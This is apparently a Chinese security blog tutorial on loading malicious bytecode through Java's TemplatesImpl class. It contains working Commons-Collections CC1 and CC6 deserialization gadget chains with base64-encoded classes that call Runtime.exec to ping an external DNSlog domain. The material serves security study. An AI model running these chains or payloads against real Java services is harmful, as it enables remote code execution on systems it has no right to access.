---
layout: mypost
title: "TemplatesImpl类加载恶意字节码技术"
categories: [Java安全]
---

## 前言

一周前写过一篇文章-->“动态加载字节码的应用”，其中一部分详细分析 🧐 了 TemplatesImpl 类&BCEL 类加载字节码技术的前世，这篇文章阐述一下其中的 TemplatesImpl 类加载恶意字节码技术的具体实现过程（今生）。

## 寻找切入点

下图可见是`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`这个类中定义了一个内部类
`TransletClassLoader`去调用了 defineClass 方法-->

![](image-136.png)

现在这个方法的作用域是 default 的，再去查看这个方法的调用情况，可以发现只有一处去调用了它-->

![](image-137.png)

而这个 defineTransletClasses 方法的作用域是 private 的，如下-->

![](image-138.png)

再去寻找哪里去调用了 defineTransletClasses 方法，一共有三处，分别如下-->

![](image-139.png)

![](image-140.png)

![](image-141.png)

可以看到前两处基本相同，但是第三处有这样一行代码-->`AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();`，它是去实例化了`_class[_transletIndex]`这个类，而这个类就是通过 defineClass 去加载的那个类，这样就可以为后续的 POC 书写省一步实例化类的步骤，拿之的 demo 解释一下-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();        //不再需要这一步
    }
}
```

OK 毫无疑问优先去选取第三处，而它这个方法（getTransletInstance）也是 private 的，如下-->

![](image-142.png)

所以需要去寻找它的调用者，只有一处-->

![](image-143.png)

而调用 getTransletInstance 方法的 newTransformer 方法是 public 的，如下-->

![](image-144.png)

切入点算是被找到了，整理一下，整个调用链 ⛓️‍💥 如下-->

```
TemplatesImpl#newTransformer() ->
    TemplatesImpl#getTransletInstance() ->
        TemplatesImpl#defineTransletClasses() ->
            TransletClassLoader#defineClass()
```

现在方法执行形成了逻辑上的链式调用，但是在实际构造调用链的时候，不难发现要想把节点串成链还需要给一些变量赋值。

## 节点串成链

按照从 newTransformer 方法到 defineClass 方法的顺序，一步步来分析需要给哪些变量赋值。

1.`TemplatesImpl#newTransformer()`这一步是不需要的-->

![](image-145.png)

2.`TemplatesImpl#getTransletInstance()`这一步需要给变量`_name`赋值且不能给变量`_class`赋值-->

![](image-146.png)

3.`TemplatesImpl#defineTransletClasses()`这一步需要给变量`_bytecodes`和`_tfactory`赋值-->

![](image-147.png)

之后才能走到下面这里

![](image-148.png)

一共三个变量需要赋值，看看都要去赋什么值？变量`_name`只是个名字，赋任意字符串即可，将变量`_bytecodes`向后跟一下，即可发现它是`defineClass(null, b, 0, b.length)`中的 b，所以这个变量要赋恶意字节码，最后一个变量`_tfactory`将它赋成`new TransformerFactoryImpl()`，具体原因见下（照猫画虎保证正常执行即可）-->

![](image-149.png)

这些赋值的操作直接用反射去修改即可，代码如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.lang.reflect.Field;
import java.util.Base64;

public class TemplatesImplLoader  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKAoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB0BAApTb3VyY2VGaWxlAQAIRE5TLmphdmEMAAoACwcAIgwAIwAkAQAfcGluZyA2eTdkNS5jeHN5cy5zcGFjZXN0YWJzLnRvcAwAJQAmAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACcBAANETlMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAgABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAMADgAAAAwAAQAAAAUADwAQAAAACAARAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAYACQAJAAwABwANAAgAFgAKAA4AAAAMAAEADQAJABIAEwAAABQAAAAHAAJMBwAVCQABABYAAAACABc=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        templatesImpl.newTransformer();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

Tips：代码中 code 的值是下面这个 java 文件编译后恶意 class 文件的 base64 编码-->

```java
import java.io.IOException;

public class DNS {
    static{
        try {
            Runtime.getRuntime().exec("ping 6y7d5.cxsys.spacestabs.top");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

此时去执行 TemplatesImplLoader.main 方法，DNSlog 平台没有收到请求且有如下的报错。

![](image-150.png)

## 解决报错

首先在 defineClass 方法中处下断点，可以发现已经成功的加载到了恶意字节码，如下-->

![](image-151.png)

![](image-152.png)

可以推断出，应该是加载的字节码哪里不符合要求，导致了这个报错。

接着在`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:422)`附近下断点调试，可以发现正常情况下代码应该走到 1 处，而现在代码走到了 2 处-->

![](image-153.png)

要想走到 1 处则必须满足`superClass.getName().equals(ABSTRACT_TRANSLET)`为 true，也就是加载的恶意类的父类必须是`com.sun.org.apache.xalan.internal.xsltc.trax.AbstractTranslet`-->

![](image-154.png)

修改一下上面给到的 DNS 类，让它继承`com.sun.org.apache.xalan.internal.xsltc.trax.AbstractTranslet`，由于 AbstractTranslet 类是一个抽象类，继承了它就要重写其中的一些方法，如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class DNS extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("ping 6y7d5.cxsys.spacestabs.top");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public void transform(DOM dom, SerializationHandler[] handlers) throws TransletException{}
    public void transform(DOM dom, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{}
}
```

将这个类编译成字节码后用 base64 编码，放到 code 中即可，最终的代码如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.lang.reflect.Field;
import java.util.Base64;

public class TemplatesImplLoader  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        templatesImpl.newTransformer();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

运行后成功触发 DNS 请求，如下-->

![](image-48.png)

## 扩大危害

现在通过 TemplatesImpl 类终于可以将 ClassLoader#defineClass 与 CC 链相结合了，还是拿 CC1 那条链（走 TransformedMap 的那条）做个例子，如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1ClassLoader {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFTEROUzsBAANkb20BAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwAGQAaBwAnDAAoACkBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAqACsBAANETlMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAAkACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAAAoACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "HelloTemplatesImpl");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesImpl),
                new InvokerTransformer(
                        "newTransformer",
                        new Class[0],
                        new Object[0]),
                new ConstantTransformer(1)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        serializeObject(instance);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

运行后成功触发 DNS 请求，如下-->

![](image-48.png)

CC6 同样可以，如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6ClassLoader {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFTEROUzsBAANkb20BAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwAGQAaBwAnDAAoACkBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAqACsBAANETlMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAAkACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAAAoACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "HelloTemplatesImpl");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesImpl),
                new InvokerTransformer(
                        "newTransformer",
                        new Class[0],
                        new Object[0]),
                new ConstantTransformer(1)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

也成功触发 DNS 请求，如下-->

![](image-48.png)

至此，成功的将 ClassLoader#defineClass 与 CC 链相结合。